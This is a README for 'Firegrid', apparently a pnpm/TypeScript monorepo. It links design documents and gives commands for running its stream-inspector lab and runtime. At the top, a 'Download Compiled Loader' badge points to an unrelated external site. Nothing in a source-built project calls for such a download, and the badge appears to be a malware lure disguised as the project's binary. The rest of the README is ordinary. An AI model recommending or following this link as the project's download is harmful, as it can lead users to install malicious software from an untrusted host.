# Firegrid

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Canonical design source:

- [Firegrid Architecture and Operation Messaging Boundary](docs/SDD_FIREGRID_ARCHITECTURE_AND_INVOCATION_BOUNDARY.md)
- [Durable Agent Substrate SDD](docs/SDD_DURABLE_AGENT_SUBSTRATE.md)
- [Docs map](docs/README.md)

Other canonical SDDs:

- [Client Event Planes And State Producers](docs/SDD_CLIENT_EVENT_PLANES_AND_STATE_PRODUCERS.md)
- [Choreography Facade](docs/SDD_CHOREOGRAPHY_FACADE.md)
- [Launchable Substrate Host And Lab](docs/SDD_LAUNCHABLE_SUBSTRATE_HOST_AND_LAB.md)

Acai specs live under `features/firegrid/` for Firegrid package, runtime,
client, substrate, and remediation requirements.

## Current State

The repo uses Firegrid product and package vocabulary:
`@firegrid/runtime` (server-side participant), `@firegrid/lab` (browser
inspector app), `@firegrid/substrate`, and `@firegrid/client`.

Run the canonical ready-for-review gate when preparing a PR:

```sh
pnpm check
```

Implementation work starts from the Acai specs and includes full
Acai ACID references in test names or nearby comments.

## Run the lab

The lab is a read-only Durable Streams inspector. Run Durable Streams
outside Firegrid, create the stream you want to inspect, then point the
lab at that stream:

```sh
durable-streams-server dev
VITE_DURABLE_STREAMS_URL=http://localhost:4437/v1/stream/firegrid pnpm dev:lab
```

The package script only starts Vite:

```sh
pnpm --filter @firegrid/lab dev
```

Run the Firegrid runtime against an existing Durable Streams endpoint
by setting `DURABLE_STREAMS_URL`:

```sh
DURABLE_STREAMS_URL=https://… pnpm --filter @firegrid/runtime run firegrid
```

The lab can be pointed elsewhere via `?streamUrl=...` in the
browser URL or by setting `VITE_DURABLE_STREAMS_URL` directly.
